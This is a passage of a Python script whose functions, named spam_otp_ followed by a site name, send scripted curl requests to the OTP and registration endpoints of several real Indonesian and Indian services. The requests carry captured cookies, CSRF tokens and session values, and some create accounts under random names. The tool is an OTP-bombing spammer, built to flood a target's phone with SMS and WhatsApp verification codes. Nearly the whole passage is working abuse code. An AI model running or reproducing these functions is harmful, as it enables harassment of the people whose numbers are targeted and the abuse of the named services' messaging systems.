        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
        
def spam_otp_myvalue(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor
        
        nomor = ''.join(filter(str.isdigit, nomor))
        
        import subprocess
        import json
        
        payload = json.dumps({
            "username": nomor,
            "template": "myvalue",
            "sendProvider": "whatsapp"
        })
        
        curl_cmd = f"""curl -s -X POST 'https://auth.myvalue.id/v2/verification/send' \\
  -H 'host: auth.myvalue.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/json' \\
  -H 'x-client-id: MyValueWeb' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://auth.myvalue.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{payload}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_joob(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \\
  -H 'host: api.joob.asia' \\
  -H 'x-platform: MOBILE_WEB' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-usertype: s' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-lang: id' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'content-type: application/json' \\
  -H 'x-deviceid: b19391d2-4ca0-4eb3-92ae-2dc3da3f8d4a' \\
  -H 'accept: */*' \\
  -H 'origin: https://grab.joob.id' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://grab.joob.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"otpAuthType":"PHONE","phoneNumber":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('data') and data['data'].get('otpSent'):
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
        
def spam_otp_datascripmall(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('62'):
            phone = '62' + phone
        
        phone = '+' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://datascripmall.id/api/app/buyer/register/request-otp' \\
  -H 'host: datascripmall.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://datascripmall.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://datascripmall.id/register/perorangan' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.657807458.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _gcl_aw=GCL.1785423521.CjwKCAjw7KvTBhA6EiwAWnutYZTFUrVgZnPcuE2Vm8b1x-lclJCkOgLxSOZXqD9XVffjvY0oVuRyGRoCdqYQAvD_BwE; _gcl_gs=2.1.k1$i1785423512$u152165420; __Host-next-auth.csrf-token=293c40a1d89e1ebf1f65529dae844021c68bf527b9010349cba333fad1321d6c%7C89d0644d6e9f85d2222e64176b6f94408161531bceedf2cc64dde51ddd332cc4; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2F; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.136969314.1787146397.1787146396; _ga_ZRQCEHEE7M=GS2.1.s1787146396$o2$g1$t1787146435$j21$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"email":"Tono34Jo80byats@gmail.com","phone_number":"{phone}","channel":"wa"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_rivafashion(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        form_key = "JKiGdrKGYAkW2J8p"
        
        curl_cmd = f"""curl -s -X POST 'https://www.rivafashion.com/en/web/register/send' \\
  -H 'host: www.rivafashion.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.rivafashion.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.rivafashion.com/en/customer/account/create/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: PHPSESSID=8j7i0etigbuoe10vqtjttoimo7; form_key=JKiGdrKGYAkW2J8p; mage-messages=; popup-timing=0; homepagecountrylangmodal=yes; user_allowed_save_cookie=%7B%221%22%3A1%7D; unbxd.userId=uid-1786008968826-52393; unbxd.visit=first_time; unbxd.visitId=visitId-1786008968840-95946; moe_c_s=1; _fbp=fb.1.1786008970673.274662173564343403; _ga=GA1.1.1840547569.1786008971; _twpid=tw.1786008971673.899374785113090323; _gcl_au=1.1.1404030908.1786008972; moe_uuid=264fe380-7149-4bee-9e60-00833114b93b; cto_bundle=BB_lVF9IaWpNUHklMkI4NWNQVUdqdkdMTGc5VmY5c0pZVTl6aGRhMWxKZTFWT3h6ZFZtaGlJWGVBQjdIZDglMkIlMkZhU0NGTCUyRlBiM2Naa0ZpeGJvTVdJWiUyQjdnUHJXVWcwZnh2cWFvMDBLTUpONnpDWUJGTTg4MWNFMjRlamNBJTJGN1NLZ2piczJrYkplZDZPTVglMkZQQkxQZHZUJTJCNm9MT1hRJTNEJTNE; _tt_enable_cookie=1; _ttp=01KZB6WBTW26NYM8K3P9V73DWQ_.tt.1; moe_u_d=Hcc7CoAwDADQu2Q2Q-wH62VKahIQCoK1k3h3S8f3QstXFdiNa9MFJLOIj93n-znAJAYWwoenW4BfaGEbIdDKTGuRokCGXw_; moe_s_a_s=5; moe_o_s_t=1786008975067; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; _scid=WsV9gSuqkOO3v9yeQPJoKkvaOQgORiT1; selected_country=yes; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; moe_s_d=DY7LjoIwAEX_petRgyBBdpRHRRgVBRQ2phQYXpYKRWZi_Pfp6uYmN_ecN8iBDirO2aivVvM8L4f6hUs8VnVPl6R_gC_AxSK3OhxRSotdrxsnYytl9uT4WnM_PinRnHK-yujBh2RMShkTvD5PpuznSXqT4i5o7dgyeMGulqog_lsRNPrwQG5ZmBot4tc2I1HZSdDkd9eqpKdaexEk-Oa1qjuwTdieA0-pk8Hc0pRFC2jIG_J3LqBb5EKvEHqlyBbob8BEgYaaHeKqiboLKue1Ju_oWJmXeB_IP0oy7oOpRuGFO_vBtVplF_dH7RU3UnP0vx1HLil6TqekG0a25kZ2V02cJ6iuIoHA4p2EBWkcR7IX0DZZ5_kpgzgAn88_; rivacategory=6227; referrer=www.rivafashion.com; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22w2J8YXRV0e0SHnDBgZLV%22%2C%22expiryDate%22%3A%222027-08-06T09%3A36%3A37.574Z%22%7D; moe_s_n=PcpBDoMwDETRu3idSB6XJIarVJVFIyNVVdtF2FXcHcKC5bz5f2r2polYMeYZOS41zXFwQdQqHuEoz8VFExKFI2620oSimVnHIkVuXT-nKnOgai9b-7w_-uNXD1bGoAj0tZ-1Q7cd; _ga_7K2P0W12ET=GS2.1.s1786008971$o1$g1$t1786009001$j30$l0$h0; moe_h_a_s=1; _scid_r=U0V9gSuqkOO3v9yeQPJoKkvaOQgORiT1C-p1aQ; private_content_version=f4210cb5f2c0ea6d1249c78e962f93f6; section_data_ids=%7B%22messages%22%3A1786009132%7D; ttcsid=1786008973225::TC4pCvDydHRHBuVJLI15.1.1786009132053.0::1.-4944.28677::158776.27.231.747::109090.3.9; ttcsid_CCDJ753C77U0P3N5FH9G=1786008973218::sUXaI8Qyy66gbrdU81p3.1.1786009132053.1' \\
  -H 'priority: u=1, i' \\
  --data-raw 'mobile_number={phone}&phone_code=%2B62&form_key={form_key}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
def spam_otp_buccheri(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://member.buccheri.com/otp-sent' \\
  -H 'host: member.buccheri.com' \\
  -H 'cache-control: max-age=0' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'upgrade-insecure-requests: 1' \\
  -H 'content-type: application/x-www-form-urlencoded' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'origin: https://member.buccheri.com' \\
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: navigate' \\
  -H 'sec-fetch-user: ?1' \\
  -H 'sec-fetch-dest: document' \\
  -H 'referer: https://member.buccheri.com/otp' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.517445661.1786009922; _clck=umhr0c%5E2%5Eg8d%5E0%5E2409; _clsk=furbu5%5E1786009926484%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_4FSQVMN5FX=GS2.1.s1786009922$o1$g1$t1786009978$j4$l0$h0; ci_session=091bc4bfe7b2c6ab4427214bfbe54337138963cd' \\
  -H 'priority: u=0, i' \\
  --data-raw 'phonenumber={phone}&otptype=SIGNUP'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_jec(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        token = "qfKK4y73SkCXC5MhZlI70Ivw5Xqe1i0cjrbBxK1p"
        rdr = "eyJpdiI6InczVHdsQ2NwZzJjQ1JWVGhDQ1FZK0E9PSIsInZhbHVlIjoiTnU5RXF0WWNWUCs5Slc4MnM1eXBxT2kxQmhlTW1sVHl4UmJKMGg3RVIzST0iLCJtYWMiOiI2NjBkZTk1MjQyMTE3NTI4MGVlMTBkMzIwNzVkZGY5MjBjMTI1ZGVlMGRkMGUyMWZkZWVhZmEyZTU4Yzk0NDIyIiwidGFnIjoiIn0%3D"
        
        curl_cmd = f"""curl -s -X POST 'https://jec.co.id/id/login-via-otp' \\
  -H 'host: jec.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://jec.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://jec.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.3.755083444.1786010701; _gid=GA1.3.1346297291.1786010702; _fbp=fb.2.1786010702252.193345616220197204; _clck=40kett%5E2%5Eg8d%5E0%5E2409; moe_uuid=eed3e8e0-f7fb-43d9-b932-9dd06765b995; _clsk=1br6z3c%5E1786010704900%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_VW5EHP2HBV=GS2.1.s1786010701$o1$g1$t1786010718$j43$l0$h0; _gcl_au=1.1.916045630.1786010701.-.-.1786010719.883151778.1786010719.1786010727; XSRF-TOKEN=eyJpdiI6Ii9kY0VzVUZNS09vTU5LWHlKNHA5SEE9PSIsInZhbHVlIjoiOWQ3R053U3ExVW80TjJlMXEzRVJIWDhoQnRjOU92TzJIVHNqU3ltWThZcDVQd1JKVi9Xeng1K0lHOGNvcHJsMHpGVEl0elI5YSt1SS93MWpWdVV6SDZjbTJES281ZlV6WGQybmIxQVEvMEpMTDdqNW83d3ZuTXN6czZTSDFoUy8iLCJtYWMiOiJhNWNjNDc1YTk2ZmUzZDVkZDQ0Y2E3OTUwMjU5NTJmMmI0ZjBhNzJhZDdiMGFhNmE2MDM1MzZhYTA3ZWFkZGU2IiwidGFnIjoiIn0%3D; jec_fe_production_session=eyJpdiI6ImVFMUZ5Wk00NXk1OXBEbHJobnhKenc9PSIsInZhbHVlIjoiRmU4ZUlQSWVxcjFDVXF3dkFIYWlyR290UlROZEVINFIvZ0ltWkYvcU1NcDVxVVQ3bVVwclhxTkMwSFg1d2Eyd1BCQ1d2YThUckt4QTJVdEhzNXl0UVZCbGdJTWpTck5wV2hBM2RlMzFIazZycjdsQVNpZ3pWYzFxd25McXJxL1QiLCJtYWMiOiIwNzBiMzY4NzQ2NTA3NmU2YjUxMThkOThhMGE2MGNhZmIwODM2YzBmMmU2NTI4ZWI2OWE3ZGNiNzgxYzUxYjU0IiwidGFnIjoiIn0%3D' \\
  --data-raw '_token={token}&loginparam=&rdr={rdr}&mobile={phone}&remember_me=1&tos=1&otp%5B%5D=&otp%5B%5D=&otp%5B%5D=&otp%5B%5D='"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_generasimaju(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        import base64
        import random
        import string
        
        firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
        password = base64.b64encode(f"{firstname}12345".encode()).decode()
        csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
        auth_token = "8af3153c67f9b3faf620b64706e18c08"
        
        curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
  -H 'host: www.generasimaju.co.id' \\
  -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: {csrf_token}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4MDA4MDkiLCJhcCI6IjUzODc5NTE1MCIsImlkIjoiNWJkMTE5ZTZlODllM2RiOSIsInRyIjoiN2IxNWViZmIyNGU0OTljYmZlMDNlYTJjYmEzMmI1ODUiLCJ0aSI6MTc4NzEzNjk0MTkxNiwidGsiOiIzMzIzOTI1In19' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'traceparent: 00-7b15ebfb24e499cbfe03ea2cba32b585-5bd119e6e89e3db9-01' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'tracestate: 3323925@nr=0-1-4800809-538795150-5bd119e6e89e3db9----1787136941916' \\
  -H 'origin: https://www.generasimaju.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.generasimaju.co.id/klub-generasi-maju/register?referral=https://www.generasimaju.co.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; __sts=eyJzaWQiOjE3ODcxMzY4ODgzNjksInR4IjoxNzg3MTM2ODk5MDUzLCJ1cmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkZrbHViLWdlbmVyYXNpLW1hanUlMkZyZWdpc3RlciUzRnJlZmVycmFsJTNEaHR0cHMlM0ElMkYlMkZ3d3cuZ2VuZXJhc2ltYWp1LmNvLmlkJTJGIiwicGV0IjoxNzg3MTM2ODk5MDUzLCJzZXQiOjE3ODcxMzY4ODgzNjksInBVcmwiOiJodHRwcyUzQSUyRiUyRnd3dy5nZW5lcmFzaW1hanUuY28uaWQlMkYiLCJwUGV0IjoxNzg3MTM2ODg4MzY5LCJwVHgiOjE3ODcxMzY4ODgzNjl9; _clsk=1l4an9c%5E1787136899807%5E2%5E1%5Eu.clarity.ms%2Fcollect; ttcsid_C4RIGKH6H18A0MH113T0=1787136887112::rCra0ykXy8_h7KsBM04x.1.1787136940557.1; ttcsid=1787136887119::o07SA2cbudxtC_Hsy8Yh.1.1787136940557.0::1.5427.11326::53296.11.324.1008::52530.9.297; _ga_KHHX33L6LL=GS2.1.s1787136886$o1$g1$t1787136940$j6$l0$h0; _gcl_au=1.1.1934825587.1787136884.805340981.1787136911.1787136910.1774024647.1787136891.1787136940; AWSALB=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==; AWSALBCORS=8iHBwm8IsmPXi2jxCtanEqkh0JjDaTqSPbmE916vmlFGE7miEu74AWb7HbujI5pbsSM91e5NQDNiPOkwU8OVf6ETe6nVzjkaTg2rjz5r2afzGw2JZRrPMJSS+xvy8SDN9TTeNCsEVlbj5wh+3L1Rez0aFheHI4kfDc+LNyUN4zf6s3p4YoBM8JF+etwf2A==' \\
  -H 'priority: u=1, i' \\
  --data-raw 'firstname={firstname}&msisdn={phone}&password={password}&mother_status=7&ispregnant=Y&pregnancyweek=1&isonpregnancyprogram=N&children_dob=&is_code_refferal_event_code=&refferal_code_event_code=&query_params%5B0%5D%5Breferral%5D=https%3A%2F%2Fwww.generasimaju.co.id%2F&auth_token={auth_token}&auth_token_prefix=registration'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('status') == 'success' or data.get('success'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('result') and 'success' in str(data.get('result')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_norkaroots(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://sso.norkaroots.kerala.gov.in/send-whatsapp-otp' \\
  -H 'host: sso.norkaroots.kerala.gov.in' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: PFanayOE9IDJ6ecbyCBAgPXmasq0DOuTAmYDBbgU' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'origin: https://sso.norkaroots.kerala.gov.in' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://sso.norkaroots.kerala.gov.in/register' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6Ik9oc3lDS1R2ZzJCWjJDY25sQ1FVcVE9PSIsInZhbHVlIjoiWkRMWFhQUHlBNHFvUTF3TmoybC90MHZiRzE1ekN1RUtBUDYxTUpYT0FXalBoVnp2MFdOYldUaGFlY2lzSkNINFNmUGloTEdSMU9YUHY4M045TEFnREcyK2pNTk5manIvM1ZtRmc4Sk1vZ3FacE5mQmN5NXVlZVdXYVFtZ1BubWwiLCJtYWMiOiI4M2QzZjc5YzljNjVkZDJiNGQxOGRmY2RhMmUyMTQ1NTQ2YjQ4NTBiYmRmMjA1OGRlM2I3ZmNlYWM5ZGRmYTZjIiwidGFnIjoiIn0%3D; norka_roots_sso_portal_session=eyJpdiI6ImtxUG9GTXVtTXkxVWxra2NWSkhvR2c9PSIsInZhbHVlIjoiTnlKeEkyNUVKOXBha3pETDgySzBnNDg2STRYTXU3ZnNFemxabnIvZHBrVzFrNFloK05Ea2EzVzJOaGhsbWRXQlJNbWFKNi9ENzJZb1RvTUxGbzNNSjQ5Q0szVzZvZURTOG02VmZDakF4SDVRWEF5SDZPZkhoSzJxWWhKTU9oTGMiLCJtYWMiOiIwMjJiZjY5MWU4OTkxZjAxNzNkMzM3OWI1ODYwZWQwOWY0ZjllYWNkMTFkOTMzNDdmMDNlZWFmOTdkODM4MTI5IiwidGFnIjoiIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw 'whatsapp_number={phone}&whatsapp_country_code=62&whatsapp_country_iso_code=id'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_kpoin(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        import random
        import string
        
        otp_type = ''.join(random.choices(string.digits, k=6))
        
        curl_cmd = f"""curl -s -X POST 'https://app.kpoin.com/api/bff/v1/notification/sendotp' \\
  -H 'host: app.kpoin.com' \\
  -H 'applicationbrand: 0' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'datetimetick: 639227634232580000' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'applicationchannel: 901101' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'applicationstoreid: 0' \\
